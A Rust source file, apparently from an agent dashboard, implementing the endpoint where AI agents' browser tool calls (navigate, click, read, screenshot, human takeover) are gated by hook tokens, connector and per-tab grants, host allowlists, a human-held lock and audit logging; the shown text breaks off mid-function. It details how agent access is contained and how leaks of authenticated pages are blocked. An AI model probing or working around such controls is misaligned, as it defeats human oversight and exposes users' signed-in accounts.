//! **The lock-gated tool endpoint** — where a granted agent's browser tool call
//! actually touches the page.
//!
//! One route, `POST /api/hook/browser/tool`, called ONLY by the embedded MCP
//! server ([`super::mcp`]) that a granted bot launches. It sits on the same
//! no-bearer, per-session-hook-token router family as the status hook, the board
//! hook and the scheduler hook — and for the same reason: the caller runs inside
//! a pane and must never hold the dashboard bearer.
//!
//! ```text
//!   bot ──stdio──▶ mcp_server.py ──HTTP(hook token)──▶ THIS ──▶ BrowserService
//!                                                        │          │
//!                                                        └ DriveLock ┘   ← the gate
//! ```
//!
//! # Four gates, in order
//!
//! 1. **Identity.** The `X-Supermux-Hook-Token` header is constant-time compared
//!    against `session_runtime.hook_token` for the session named in the body. Bot
//!    A's token authenticates only bot A, so bot A can never drive bot B's
//!    context — even though every bot runs the identical server script.
//! 2. **Connector grant.** The session must hold an enabled `shared-browser`
//!    grant (its own, its company's, or the `*` all-agents one). An ungranted bot
//!    that somehow learned the URL still gets a 403, and — decisively — never
//!    spawns chrome. For a workspace tab this is **necessary and NOT sufficient**.
//! 3. **Per-tab grant** (shared-browser v1, R2 — the security crux). When the
//!    call names a `tab`, the session must ALSO hold a per-tab grant on that tab,
//!    resolved through the same three tiers and the same hard company
//!    containment ([`crate::db::browser_tabs::tabs_for_session`]). Then the tab
//!    must be usable: a `needs_login` tab refuses every agent verb (409), and an
//!    agent `navigate` off the tab's origin allowlist is refused (403).
//! 4. **The wheel.** Every acting tool calls
//!    [`super::lock::DriveLock::ensure_agent`] BEFORE touching the page and
//!    answers `409 Conflict` while the human drives.
//!
//! Gate 3 sits **before dispatch**, which is what makes it total: it covers
//! `read` and `screenshot` for free, and it cannot be forgotten by a future
//! sixth verb.
//!
//! # Why READS are gated too
//!
//! [`super::context::AgentContext::evaluate`] is deliberately ungated (phase 2's
//! takeover UI must read page state while the human drives). This endpoint is the
//! AGENT's door, and it gates reads as well: the whole point of a takeover is a
//! human typing a password, a 2FA code or a card number into that page. An agent
//! that could `browser_read`/`browser_screenshot` mid-takeover would read exactly
//! those keystrokes back out. While the human holds the wheel, the agent sees
//! nothing.
//!
//! **On a workspace tab the argument is stronger, not weaker.** The lock-free
//! reasoning "observing the page is never a control conflict" is true for a
//! scratch context and false for a logged-in one, where **reading IS the
//! exfiltration**. Reads stay lock-gated here AND become grant-gated: without a
//! per-tab grant, `browser_read` and `browser_screenshot` on a tab are 403, in
//! the same breath as `navigate` and `click`. A confused deputy — any bot holding
//! the connector grant reaching every authenticated surface in the company — is
//! exactly what gate 3 exists to prevent.

use axum::extract::State;
use axum::http::HeaderMap;
use axum::routing::post;
use axum::{Json, Router};
use serde::Deserialize;
use serde_json::{json, Value};
use std::time::Duration;

use crate::db::browser_tabs as db_tabs;
use crate::db::connectors as db_connectors;
use crate::error::AppError;
use crate::extract::LenientJson;
use crate::sessions::takeover_ask::TakeoverAsk;
use crate::state::AppState;

use super::context::AgentContext;
use super::error::BrowserError;
use super::lock::{Actor, HandOff};
use super::mcp::BROWSER_ID;
use super::tab::{Tab, TabMeta};
use std::sync::Arc;

/// Default / ceiling for a `request_human_takeover` park. The hand-back wakes the
/// call the instant it happens, so the ceiling only bites when nobody comes.
const DEFAULT_PARK: u64 = 120;
const MAX_PARK: u64 = 600;

/// Default / ceiling on returned page text. A page is not a context window.
const DEFAULT_MAX_CHARS: usize = 8_000;
const MAX_MAX_CHARS: usize = 40_000;

/// The agent→browser tool sub-router. Merged at the TOP level of
/// [`crate::http::router`] (NO bearer layer — auth is the per-session hook token,
/// validated in the handler).
pub fn router_for(state: AppState) -> Router {
    Router::new()
        .route("/api/hook/browser/tool", post(tool_handler))
        .with_state(state)
}

#[derive(Debug, Deserialize)]
pub struct ToolBody {
    /// The supermux session name (`$SUPERMUX_SESSION`); scopes the token check
    /// AND names the browser context to drive.
    pub session: String,
    /// `navigate` | `click` | `read` | `screenshot` | `request_human_takeover`
    /// | `list_tabs`.
    pub tool: String,
    /// The tool's arguments (shape per tool).
    #[serde(default)]
    pub args: Value,
}

/// `POST /api/hook/browser/tool` — run ONE browser tool for a granted session.
async fn tool_handler(
    State(state): State<AppState>,
    headers: HeaderMap,
    LenientJson(body): LenientJson<ToolBody>,
) -> Result<Json<Value>, AppError> {
    // 1. Identity: the session's own hook token, constant-time (401 on any miss,
    //    including an unknown session — no existence oracle).
    crate::hooks::verify_hook_token(&state, &body.session, &headers).await?;
    if !crate::sessions::valid_name(&body.session) {
        return Err(AppError::BadRequest("invalid session name".into()));
    }
    // 2. Grant: no browser access, no browser — and no chrome spawned.
    //
    //    **Either grant opens this door** ([`may_use_browser`]): the store's
    //    `shared-browser` connector grant, OR a tab the human has lent this bot.
    //    Keying it on the connector grant alone is what made "the human lent me a
    //    tab" and "I may touch a browser" two different facts, and a bot lent a
    //    tab got a bare 403 here — measured live on `folderwijzer`, whose own
    //    helper script hit `forbidden: session 'folderwijzer' has no
    //    'shared-browser' grant` on `list_tabs` right after a restart, while its
    //    tab grant sat in the DB. Lending now writes the connector grant too
    //    (`browser::api::lend_the_browser`), so the two agree going forward; this
    //    is the authorization layer saying the same thing, so a row written
    //    before the fix, or by any other path, can never resurrect that 403.
    if !may_use_browser(&state, &body.session).await? {
        return Err(AppError::Forbidden(format!(
            "session '{}' has no '{BROWSER_ID}' grant and no shared tab; ask the human to lend you a tab in supermux -> Browser",
            body.session
        )));
    }

    let args = &body.args;

    // `list_tabs` is the ONE verb reachable on the connector grant alone. It
    // returns only the tabs this session may use — an empty list for a session
    // with no tab grants, which is the honest answer and not an existence
    // oracle. It never touches a page, so it never spawns chrome either.
    if body.tool == "list_tabs" {
        let tabs = list_tabs(&state, &body.session).await?;
        return Ok(Json(json!({ "ok": true, "result": tabs })));
    }

    // 3. **The tab gate** (R2). `tab` absent ⇒ the scratch context, byte-for-byte
    //    today's behaviour. `tab` present ⇒ per-tab grant, containment, and
    //    usability, ALL before dispatch — so `read` and `screenshot` are covered
    //    without either verb knowing about it.
    let target = match str_arg(args, "tab") {
        Some(tab_id) => resolve_tab(&state, &body.session, tab_id).await?,
        None => {
            // Lazily spawns the ONE chrome on first use by any granted session.
            Target::Scratch(
                state
                    .browser
                    .context_for(&body.session)
                    .await
                    .map_err(browser_err)?,
            )
        }
    };

    // 4. Audit BEFORE the CDP call, so a call that crashes the page is still on
    //    the record (§8.7). Only tab traffic is audited: a scratch context holds
    //    nothing but its own agent's work.
    if let Some(tab_id) = target.tab_id() {
        audit_tab_call(&state, &body.session, &body.tool, tab_id, args).await;
    }

    let result = match body.tool.as_str() {
        "navigate" => navigate(&target, args).await,
        "click" => click(target.page(), args).await,
        "read" => read(target.page(), args).await,
        "screenshot" => screenshot(target.page(), args).await,
        "request_human_takeover" => takeover(&state, &body.session, &target, args).await,
        other => {
            return Err(AppError::BadRequest(format!("unknown browser tool '{other}'")));
        }
    };
    let result = result.map_err(browser_err)?;

    // 5. **The landing check.** Where the page ended up, not just where the call
    //    pointed it — see `enforce_landing_origin`. Runs on the RESULT, so the
    //    URL it judges is the very one the payload was read from; there is no
    //    window in which the page could move between the check and the read.
    let result = match &target {
        Target::Workspace(tab, origins) => {
            enforce_landing_origin(&state, &body.session, tab, origins, &body.tool, result).await?
        }
        Target::Scratch(_) => result,
    };
    Ok(Json(json!({ "ok": true, "result": result })))
}

/// What a tool call is pointed at: today's per-session scratch context, or a
/// persistent workspace tab the caller has been granted.
///
/// The page primitives are identical for both — the difference lives entirely in
/// the gate that produced this value, plus the per-tab origin allowlist that only
/// a [`Target::Workspace`] carries.
enum Target {
    Scratch(Arc<AgentContext>),
    /// A workspace tab plus **the allowlist as the DB has it right now**.
    ///
    /// Read from the row on every call rather than from the live `Tab`'s cached
    /// meta on purpose: a human who narrows a tab's allowlist must have that
    /// take effect on the very next agent call, not whenever the tab happens to
    /// be rehydrated. A stale in-memory allowlist is a permission that outlives
    /// its revocation.
    Workspace(Arc<Tab>, Vec<String>),
}

impl Target {
    /// The page every verb drives.
    fn page(&self) -> &AgentContext {
        match self {
            Self::Scratch(ctx) => ctx,
            Self::Workspace(tab, _) => tab.page(),
        }
    }

    /// The durable tab id, for the audit trail and the lock subject.
    fn tab_id(&self) -> Option<&str> {
        match self {
            Self::Scratch(_) => None,
            Self::Workspace(tab, _) => Some(tab.id()),
        }
    }
}

/// **Resolve a `tab` argument into a driveable target, or refuse.**
///
/// Every refusal below is rendered `403` by [`browser_err`] except the
/// login-expiry one, so an ungranted agent cannot use this endpoint to learn
/// which tab ids exist. Order matters: shape, then grant, then existence.
async fn resolve_tab(state: &AppState, session: &str, tab_id: &str) -> Result<Target, AppError> {
    // Shape gate first — the id becomes a map key, a log field and a lock
    // subject, and must be checked before any of that (the `valid_name` shape).
    if !db_tabs::valid_tab_id(tab_id) {
        return Err(browser_err(BrowserError::NotGrantedForTab {
            session: session.to_string(),
            tab: tab_id.to_string(),
        }));
    }
    // THE gate. `has_tab_grant` is fail-closed on every path, and is built on the
    // same predicate `list_tabs` uses, so discovery and enforcement cannot drift.
    if !has_tab_grant(state, session, tab_id).await {
        return Err(browser_err(BrowserError::NotGrantedForTab {
            session: session.to_string(),
            tab: tab_id.to_string(),
        }));
    }
    let pool = &state.pool;
    let row = db_tabs::get(pool, tab_id)
        .await
        .map_err(|e| AppError::Internal(anyhow::anyhow!(e)))?
        .ok_or_else(|| browser_err(BrowserError::NoSuchTab(tab_id.to_string())))?;

    // **Honest expiry** (§7.3). An agent reading a login wall and reporting its
    // contents as data is worse than an agent that errors, so a lapsed tab
    // refuses every verb — including the read verbs — rather than serving one.
    if row.login_state == db_tabs::LOGIN_NEEDED {
        // Raise the in-chat ask through the affordance the human already knows,
        // so the blockage is visible where takeovers already are.
        let reason = format!("browser tab '{tab_id}' needs you to sign in again");
        if state.set_browser_takeover(session, TakeoverAsk::new(session, &reason)) {
            crate::hooks::broadcast_activity_delta(state, session);
        }
        return Err(browser_err(BrowserError::TabNeedsLogin {
            tab: tab_id.to_string(),
        }));
    }

    let origins = db_tabs::origins_of(&row);
    let meta = TabMeta {
        title: row.title.clone(),
        url: row.url.clone(),
        pinned: row.pinned != 0,
        origins: origins.clone(),
        login_state: row.login_state.clone(),
    };
    let tab = state
        .browser
        .ensure_tab(tab_id, meta)
        .await
        .map_err(browser_err)?;
    // `ensure_tab` hands back the ALREADY-LIVE tab unchanged when there is one,
    // so its cached meta can be older than the row. Push the row's answer back
    // in: a human who just narrowed the allowlist, or cleared `needs_login`,
    // must be reflected on this call and not on some later rehydrate.
    tab.set_origins(origins.clone()).await;
    tab.set_login_state(row.login_state.clone()).await;
    // Freshness for the workspace UI's "last used" ordering.
    let _ = db_tabs::update(
        pool,
        tab_id,
        &db_tabs::TabPatch {
            touch_used: true,
            ..Default::default()
        },
    )
    .await;
    Ok(Target::Workspace(tab, origins))
}

/// Does this session hold an ENABLED `shared-browser` grant (its own or `*`)?
async fn has_browser_grant(state: &AppState, session: &str) -> Result<bool, AppError> {
    let grants = db_connectors::grants_for_session(&state.pool, session).await?;
    Ok(grants
        .iter()
        .any(|g| g.connector_id == BROWSER_ID && g.enabled != 0))
}

/// **May this session touch a browser at all?** The connector grant OR at least
/// one tab the human has lent it.
///
/// The second half is not redundant. `browser::api::lend_the_browser` writes the
/// connector grant whenever a tab is lent, so the two normally agree — but the
/// AUTHORIZATION must not depend on that write having happened. A tab grant made
/// before that existed, restored from a backup, or written by any other path
/// would otherwise leave the human's own decision ("this bot may use my
/// signed-in tab") refused at the door, which is exactly the 403 this fix is
/// about. The human lending a tab IS the grant; the connector row is how the
/// TOOLS get wired at launch.
///
/// It is not a widening either: a session with neither is refused exactly as
/// before, and WHICH tab may be touched is still `has_tab_grant`, unchanged.
async fn may_use_browser(state: &AppState, session: &str) -> Result<bool, AppError> {
    if has_browser_grant(state, session).await? {
        return Ok(true);
    }
    Ok(!db_tabs::tabs_for_session(&state.pool, session)
        .await
        .unwrap_or_default()
        .is_empty())
}

/// **Does this session hold a grant on THIS tab?** (v1 §5.2 / §8.2 — R2.)
///
/// Two conditions, both required:
///
/// 1. browser access at all ([`may_use_browser`] — the connector grant, or any
///    lent tab) — **necessary, and nowhere near sufficient**: it lets a bot open
///    a scratch browser, not read the human's authenticated tabs;
/// 2. a per-tab grant resolved through the same three tiers as
///    `grants_for_session` (own slug > `@company:<id>` > `*`, `enabled = 1`),
///    **with the hard company containment of §8.3 re-checked at call time** — so
///    a session moved between companies after the grant was made loses access
///    immediately, rather than merely being hidden in the UI.
///
/// Both live inside [`crate::db::browser_tabs::tabs_for_session`], which is also
/// what `list_tabs` returns: one predicate, so what an agent can *discover* and
/// what an agent can *touch* can never disagree.
///
/// **Fail-closed on every path.** A DB error, a malformed row, a missing session
/// — all read as *not granted*. There is no error branch that reaches a page.
pub async fn has_tab_grant(state: &AppState, session: &str, tab_id: &str) -> bool {
    match may_use_browser(state, session).await {
        Ok(true) => {}
        _ => return false,
    }
    db_tabs::session_may_use(&state.pool, session, tab_id)
        .await
        .unwrap_or(false)
}

/// `browser_list_tabs` — the tabs this session may use, and nothing else.
///
/// Grant-FILTERED, not grant-gated: it needs only the connector grant and answers
/// an empty list for a session with no tab grants. That is the honest answer and
/// not an oracle — an ungranted session learns nothing about which tabs exist.
/// It is the tool an agent calls first, and it doubles as discovery.
///
/// A `needs_login` tab is still LISTED, with its state, so the agent can report
/// the blockage accurately instead of guessing why its verbs are refused.
async fn list_tabs(state: &AppState, session: &str) -> Result<Value, AppError> {
    if !may_use_browser(state, session).await? {
        return Err(AppError::Forbidden(format!(
            "session '{session}' has no '{BROWSER_ID}' grant and no shared tab"
        )));
    }
    let rows = db_tabs::tabs_for_session(&state.pool, session)
        .await
        .map_err(|e| AppError::Internal(anyhow::anyhow!(e)))?;
    let live = state.browser.live_tabs().await;
    let tabs: Vec<Value> = rows
        .iter()
        .map(|t| {
            json!({
                "tab": t.id,
                "title": t.title,
                "url": t.url,
                "pinned": t.pinned != 0,
                // Never a bare green dot: the state AND the age of its evidence.
                "login_state": t.login_state,
                "last_verified": t.last_probe_at,
                "live": live.contains(&t.id),
                "allowed_hosts": db_tabs::origins_of(t),
            })
        })
        .collect();
    Ok(json!({ "tabs": tabs, "count": tabs.len() }))
}

/// Record an agent verb against a tab **before** the CDP call (§8.7).
///
/// Best-effort: an audit write that fails must not deny the call it is recording
/// (that would turn the ledger into an availability dependency), but it is logged
/// loudly. `detail` carries metadata only — a URL and a clipped selector, never
/// page contents.
async fn audit_tab_call(state: &AppState, session: &str, tool: &str, tab_id: &str, args: &Value) {
    let action = match tool {
        "navigate" => "browser.navigate",
        "click" => "browser.click",
        "read" => "browser.read",
        "screenshot" => "browser.screenshot",
        "request_human_takeover" => "browser.takeover",
        other => other,
    };
    let (selector, _) = clip(str_arg(args, "selector").unwrap_or_default(), 200);
    let (url, _) = clip(str_arg(args, "url").unwrap_or_default(), 500);
    let detail = json!({
        "tool": tool,
        "url": url,
        "selector": selector,
    });
    if let Err(e) = crate::db::audit::log(
        &state.pool,
        &format!("agent:{session}"),
        action,
        &format!("tab:{tab_id}"),
        detail,
    )
    .await
    {
        tracing::warn!(session, tab = tab_id, error = %e, "browser: tab audit write failed");
    }
}

/// Map a browser error onto HTTP. The ONE that matters is the lock refusal:
/// `409 Conflict` is what the MCP server turns into the agent-readable
/// "the human is driving" result.
///
/// `pub(super)` so the HUMAN door ([`super::api`]) renders the same typed
/// outcomes — a launch failure, a tab cap, a locked profile — instead of
/// growing a second, drifting mapping. The two doors differ in what they
/// *allow*, never in how they *name* what went wrong.
pub(super) fn browser_err(e: BrowserError) -> AppError {
    match e {
        BrowserError::HumanDriving { .. } | BrowserError::TakeoverWait { .. } => {
            AppError::Conflict(e.to_string())
        }
        BrowserError::TooManyContexts { .. } | BrowserError::TooManyTabs { .. } => {
            AppError::TooManyRequests(e.to_string())
        }
        BrowserError::NoSuchContext(_) => AppError::NotFound(e.to_string()),
        // **No existence oracle.** `NoSuchTab` and `NotGrantedForTab` are both
        // 403 to an agent caller, deliberately: a 404 here would tell an
        // ungranted bot which tab ids are real, which is the same leak the
        // constant-time hook-token check exists to avoid. The distinction
        // survives in the logs and on the human surface, where it is safe.
        BrowserError::NoSuchTab(_) | BrowserError::NotGrantedForTab { .. } => {
            AppError::Forbidden(e.to_string())
        }
        BrowserError::OriginNotAllowed { .. } => AppError::Forbidden(e.to_string()),
        // Honest expiry: a distinct, actionable 409 the agent can report.
        BrowserError::TabNeedsLogin { .. } => AppError::Conflict(e.to_string()),
        BrowserError::ProfileLocked { .. } => AppError::Conflict(e.to_string()),
        BrowserError::ChromeMissing(_)
        | BrowserError::Launch(_)
        | BrowserError::Transport(_)
        | BrowserError::Protocol { .. }
        | BrowserError::Timeout(_)
        | BrowserError::Evaluate(_)
        | BrowserError::ShuttingDown => AppError::Internal(anyhow::anyhow!(e.to_string())),
    }
}

fn str_arg<'a>(args: &'a Value, key: &str) -> Option<&'a str> {
    args.get(key)
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|s| !s.is_empty())
}

/// The host of an absolute URL, lowercased, or `None` for anything this gate
/// cannot reason about.
///
/// Deliberately strict and hand-rolled (this module's stated pride is that it
/// adds no crates): only `http`/`https` are recognised, and everything else —
/// `javascript:`, `data:`, `file:`, a relative path, a userinfo trick — yields
/// `None`, which the caller turns into a refusal. Fail closed.
pub(super) fn host_of(url: &str) -> Option<String> {
    let rest = url
        .strip_prefix("https://")
        .or_else(|| url.strip_prefix("http://"))?;
    let authority = rest
        .split(['/', '?', '#'])
        .next()
        .unwrap_or_default();
    // `user@host` — the host is what the browser connects to, never the userinfo.
    let hostport = authority.rsplit('@').next().unwrap_or_default();
    // Strip a port; an IPv6 literal keeps its brackets and never matches a rule.
    let host = match hostport.strip_prefix('[') {
        Some(v6) => format!("[{}]", v6.split(']').next().unwrap_or_default()),
        None => hostport.split(':').next().unwrap_or_default().to_string(),
    };
    let host = host.trim().to_ascii_lowercase();
    (!host.is_empty()).then_some(host)
}

/// A JS string literal for `s` — `serde_json` escaping is a superset of JS's, so
/// a selector can never break out of the expression it is spliced into.
fn js_string(s: &str) -> String {
    serde_json::to_string(s).unwrap_or_else(|_| "\"\"".into())
}

/// Trim `s` to `max` CHARS (never bytes), flagging the cut.
fn clip(s: &str, max: usize) -> (String, bool) {
    if s.chars().count() <= max {
        return (s.to_string(), false);
    }
    (s.chars().take(max).collect(), true)
}

/// The result a parked `request_human_takeover` reports once the wheel comes
/// back — and the whole of FINDING 2.
///
/// The lock is released on ANY takeover-socket exit, because a human who is gone
/// must not hold the wheel. But a tab close, a dead mobile link and a ping
/// timeout are not "the human finished": telling the agent they did is a lie it
/// then acts on, mid sign-in, on a half-filled form. Only
/// [`HandOff::Explicit`] — the hand-back button — earns the success sentence.
fn handback_result(handoff: Option<HandOff>, url: &str, reason: &str) -> Value {
    match handoff {
        Some(h) if h.is_explicit() => json!({
            "handed_back": true,
            "human_disconnected": false,
            "message": "The human finished and handed the wheel back. Continue from this page.",
            "url": url,
            "reason": reason,
        }),
        // `Disconnected`, `Abandoned`, or (defensively) no recorded hand-off:
        // the wheel is ours again, but nobody confirmed anything.
        _ => json!({
            "handed_back": false,
            "human_disconnected": true,
            "message": "The human disconnected before confirming — the page may be incomplete. \
                        Verify its state before acting on it, or ask for takeover again.",
            "url": url,
            "reason": reason,
        }),
    }
}

/// **Where the page ACTUALLY is, after the verb ran** (§8.4, the landing half).
///
/// # The hole this closes
///
/// The destination check in [`navigate`] only sees URLs an agent *asked* for.
/// But a workspace tab moves on its own: a `browser_click` on a link, a
/// `location.replace`, an OAuth bounce. So a bot legitimately granted
/// `tb_mail` (allowlist `mail.example.com`) could click a link, land anywhere,
/// and read it — and on a SHARED profile "anywhere" includes every other service
/// the human is signed into in the same jar. That is a cross-tab privilege
/// escalation dressed as a normal read.
///
/// # The choice: hard-refuse the READS, report the rest
///
/// * `read` / `screenshot` / `navigate` — **refused** with
///   [`BrowserError::OriginNotAllowed`] (403). These are the verbs that move
///   content off the page and into the agent, and the module's whole posture is
///   that on an authenticated tab *reading is the exfiltration*. The payload is
///   dropped, not trimmed: half of an off-allowlist page is still off-allowlist.
/// * `click` / `request_human_takeover` — **not refused**, because the page has
///   already moved and refusing after the fact protects nothing. They come back
///   stamped `off_allowlist` with the host, so the agent knows the tab drifted
///   and the next read is going to be refused.
///
/// # Why this does not break real logins
///
/// A human's sign-in never passes through here. Human navigation happens over
/// the takeover socket as [`Actor::Human`], which this endpoint does not gate at
/// all — so an SSO chain hopping through `login.microsoftonline.com`,
/// `accounts.google.com` and back is untouched, and the human can add any host
/// the tab legitimately uses to its allowlist while they set it up. What IS
/// refused is an *agent* reading an identity provider's page, which it should
/// never be doing: the honest move there is `request_human_takeover`, and that
/// verb keeps working. The refusal names the host precisely so the agent can say
/// which one the human would need to allow.
///
/// Every drift is audited under its own action (`browser.off_allowlist`), so tab
/// activity review catches a tab that keeps wandering even when the read that
/// followed was refused.
async fn enforce_landing_origin(
    state: &AppState,
    session: &str,
    tab: &Arc<Tab>,
    origins: &[String],
    tool: &str,
    result: Value,
) -> Result<Value, AppError> {
    let landed = result.get("url").and_then(Value::as_str).unwrap_or_default();
    let Some(host) = landing_drift(landed, origins) else {
        return Ok(result);
    };

    let (url_note, _) = clip(landed, 500);
    crate::db::audit::log(
        &state.pool,
        &format!("agent:{session}"),
        "browser.off_allowlist",
        &format!("tab:{}", tab.id()),
        json!({ "tool": tool, "host": host, "url": url_note, "allowed": origins }),
    )
    .await
    .ok();

    if drift_refuses(tool) {
        Err(browser_err(BrowserError::OriginNotAllowed {
            tab: tab.id().to_string(),
            host,
        }))
    } else {
        // The page already moved; say so instead of pretending it did not.
        {
            let mut result = result;
            if let Some(obj) = result.as_object_mut() {
                obj.insert("off_allowlist".into(), json!(true));
                obj.insert("off_allowlist_host".into(), json!(host));
                obj.insert(
                    "warning".into(),
                    json!(
                        "This tab is now on a host outside its allowlist. Reading or \
                         screenshotting it will be refused. Ask the human to allow this host on \
                         the tab, or navigate back."
                    ),
                );
            }
            Ok(result)
        }
    }
}

/// **Has the page drifted off the tab's allowlist?** `Some(host)` when it has —
/// the host to refuse on and to audit; `None` when the landing is fine.
///
/// Split out from [`enforce_landing_origin`] so the decision is testable without
/// a browser, because this is the predicate that decides whether authenticated
/// content leaves the server.
///
/// * `about:blank` / no URL ⇒ fine. The empty page has no host and no content.
/// * A scheme `host_of` cannot parse (`data:`, `file:`, `javascript:`) ⇒ **drift**.
///   A URL with no host can never satisfy a host allowlist; waving it through
///   because the check "does not apply" is how allowlists get bypassed.
fn landing_drift(landed: &str, origins: &[String]) -> Option<String> {
    if landed.is_empty() || landed == "about:blank" {
        return None;
    }
    let host = host_of(landed).unwrap_or_default();
    if !host.is_empty() && db_tabs::host_allowed(origins, &host) {
        return None;
    }
    Some(host)
}

/// Does a drift REFUSE this verb, or merely annotate it?
///
/// Refuse the verbs that carry page content back to the agent; annotate the ones
/// where the page has already moved and refusing protects nothing. A verb this
/// function has never heard of is refused — a new content verb must not be able
/// to slip past the allowlist by being new.
fn drift_refuses(tool: &str) -> bool {
    !matches!(tool, "click" | "request_human_takeover")
}

// ── the tools ────────────────────────────────────────────────────────────────

/// **Navigation, origin-scoped on a workspace tab** (§8.4).
///
/// This is only HALF the scope check — the destination half. The other half is
/// [`enforce_landing_origin`], which re-checks where the page ACTUALLY IS before
/// any content leaves the server. Guarding only the destination was a real hole:
/// a click on an inbox link, or a page's own JS redirect, moves the tab
/// off-allowlist without ever calling this function, and the next `read` would
/// have returned whatever was then loaded.
///
/// A scratch context has no allowlist and is unchanged.
async fn navigate(target: &Target, args: &Value) -> Result<Value, BrowserError> {
    let ctx = target.page();
    ctx.lock().ensure_agent()?;
    let url = str_arg(args, "url").ok_or_else(|| BrowserError::Protocol {
        method: "navigate".into(),
        message: "missing `url`".into(),
    })?;
    if let Target::Workspace(tab, origins) = target {
        let host = host_of(url).ok_or_else(|| BrowserError::OriginNotAllowed {
            tab: tab.id().to_string(),
            host: String::new(),
        })?;
        if !db_tabs::host_allowed(origins, &host) {
            return Err(BrowserError::OriginNotAllowed {
                tab: tab.id().to_string(),
                host,
            });
        }
    }
    ctx.navigate(Actor::Agent, url).await?;
    let landed = ctx.evaluate("({url: location.href, title: document.title})").await?;
    Ok(json!({
        "navigated": true,
        "url": landed.get("url").cloned().unwrap_or(Value::Null),
        "title": landed.get("title").cloned().unwrap_or(Value::Null),
    }))
}

async fn click(ctx: &AgentContext, args: &Value) -> Result<Value, BrowserError> {
    ctx.lock().ensure_agent()?;
    let (x, y, via) = if let Some(sel) = str_arg(args, "selector") {
        // Resolve the selector to the element's centre IN THE PAGE, scrolling it
        // into view first — a click at coordinates that are off-screen lands on
        // whatever happens to be there instead.
        let expr = format!(
            "(() => {{ const el = document.querySelector({sel}); if (!el) return null; \
             el.scrollIntoView({{block:'center', inline:'center'}}); \
             const r = el.getBoundingClientRect(); \
             return {{x: r.left + r.width/2, y: r.top + r.height/2, w: r.width, h: r.height}}; }})()",
            sel = js_string(sel)
        );
        let found = ctx.evaluate(&expr).await?;
        if found.is_null() {
            return Err(BrowserError::Evaluate(format!(
                "no element matches selector {sel}"
            )));
        }
        let x = found.get("x").and_then(Value::as_f64).unwrap_or(0.0);
        let y = found.get("y").and_then(Value::as_f64).unwrap_or(0.0);
        (x, y, json!({ "selector": sel }))
    } else {
        let x = args.get("x").and_then(Value::as_f64);
        let y = args.get("y").and_then(Value::as_f64);
        match (x, y) {
            (Some(x), Some(y)) => (x, y, json!({ "coords": [x, y] })),
            _ => {
                return Err(BrowserError::Protocol {
                    method: "click".into(),
                    message: "needs a `selector` or both `x` and `y`".into(),
                })
            }
        }
    };
    ctx.click(Actor::Agent, x, y).await?;
    let url = ctx.current_url().await.unwrap_or_default();
    Ok(json!({ "clicked": true, "at": [x, y], "target": via, "url": url }))
}

async fn read(ctx: &AgentContext, args: &Value) -> Result<Value, BrowserError> {
    // Gated on purpose — see the module docs: while the human drives, the agent
    // reads nothing off the page they are typing into.
    ctx.lock().ensure_agent()?;
    let selector = str_arg(args, "selector");
    let want_html = args.get("html").and_then(Value::as_bool).unwrap_or(false);
    let max = args
        .get("max_chars")
        .and_then(Value::as_u64)
        .map(|n| n as usize)
        .unwrap_or(DEFAULT_MAX_CHARS)
        .clamp(1, MAX_MAX_CHARS);

    let target = match selector {
        Some(sel) => format!("document.querySelector({})", js_string(sel)),
        None => "document.body".to_string(),
    };
    let field = if want_html { "outerHTML" } else { "innerText" };
    let expr = format!(
        "(() => {{ const el = {target}; return {{url: location.href, title: document.title, \
         found: !!el, text: el ? (el.{field} || '') : ''}}; }})()"
    );
    let out = ctx.evaluate(&expr).await?;
    if !out.get("found").and_then(Value::as_bool).unwrap_or(false) {
        if let Some(sel) = selector {
            return Err(BrowserError::Evaluate(format!(
                "no element matches selector {sel}"
            )));
        }
    }
    let raw = out.get("text").and_then(Value::as_str).unwrap_or_default();
    let (text, truncated) = clip(raw, max);
    Ok(json!({
        "url": out.get("url").cloned().unwrap_or(Value::Null),
        "title": out.get("title").cloned().unwrap_or(Value::Null),
        "format": if want_html { "html" } else { "text" },
        "text": text,
        "truncated": truncated,
    }))
}

async fn screenshot(ctx: &AgentContext, _args: &Value) -> Result<Value, BrowserError> {
    // Gated for the same reason as `read`: a screenshot mid-takeover is a photo
    // of the human's login form.
    ctx.lock().ensure_agent()?;
    let data = ctx.screenshot().await?;
    let url = ctx.current_url().await.unwrap_or_default();
    Ok(json!({
        "data": data,
        "mime_type": "image/jpeg",
        "bytes": data.len(),
        "url": url,
    }))
}

/// **The hand-off.** Flip the wheel to the human, raise the in-chat card, and
/// PARK this call (which is the agent's tool call) until they hand back.
///
/// Both orders work, which is the point:
///   * card first — the human takes over from the chat card, the agent's next
///     acting tool is refused, then this call returns as soon as they detach;
///   * tool first — this call flips the lock and parks; the human opens the panel
///     (an idempotent re-takeover), finishes, detaches, and the release wakes us.
///
/// If NOBODY comes before the budget expires, the wheel goes back to the agent
/// rather than leaving the context stuck under a human who never arrived.
async fn takeover(
    state: &AppState,
    session: &str,
    target: &Target,
    args: &Value,
) -> Result<Value, BrowserError> {
    let ctx = target.page();
    let reason = str_arg(args, "reason").unwrap_or("the agent needs you to take the wheel");
    let park = args
        .get("timeout_seconds")
        .and_then(Value::as_u64)
        .unwrap_or(DEFAULT_PARK)
        .clamp(5, MAX_PARK);

    // The chat surface: a card that opens the takeover panel. For a workspace tab
    // the ask NAMES the tab, so the human knows which page they are being called
    // to — the card is the same affordance either way.
    let ask_reason = match target.tab_id() {
        Some(tab_id) => format!("{reason} (tab {tab_id})"),
        None => reason.to_string(),
    };
    if state.set_browser_takeover(session, TakeoverAsk::new(session, &ask_reason)) {
        crate::hooks::broadcast_activity_delta(state, session);
    }

    let previous = ctx.lock().request_human_takeover();
    tracing::info!(
        session = %session,
        tab = ?target.tab_id(),
        %previous,
        reason,
        "browser: agent asked for a human takeover"
    );

    let waited = ctx.lock().await_agent(Duration::from_secs(park)).await;

    // The ask is over either way — the card must not outlive it.
    if state.clear_browser_takeover(session) {
        crate::hooks::broadcast_activity_delta(state, session);
    }

    match waited {
        Ok(()) => {
            let url = ctx.current_url().await.unwrap_or_default();
            // WHY the wheel came back decides what we may claim — see
            // `handback_result`.
            Ok(handback_result(ctx.lock().last_handoff(), &url, reason))
        }
        Err(BrowserError::TakeoverWait { .. }) => {
            // "Is a human actually looking?" is asked of THIS subject — a viewer
            // on the tab route holds the tab's slot, not the session's.
            let attached = match target.tab_id() {
                Some(tab_id) => super::takeover::is_tab_attached(tab_id),
                None => super::takeover::is_attached(session),
            };
            if !attached {
                // Nobody ever picked it up — don't leave the context wedged.
                ctx.lock().release_to_agent(HandOff::Abandoned);
